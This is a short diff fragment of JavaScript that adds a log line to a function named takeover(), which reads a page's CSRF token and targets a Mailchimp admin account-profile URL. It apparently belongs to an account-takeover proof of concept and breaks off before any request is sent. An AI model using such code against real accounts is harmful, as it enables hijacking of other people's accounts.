@@ -1,4 +1,5 @@
 function takeover(){
+	console.log('Taking Over....');
 	csrf_token=document.getElementsByName('__csrf_token')[0].value;
 	url='https://us1.admin.mailchimp.com/i/account/profile/post/'
 
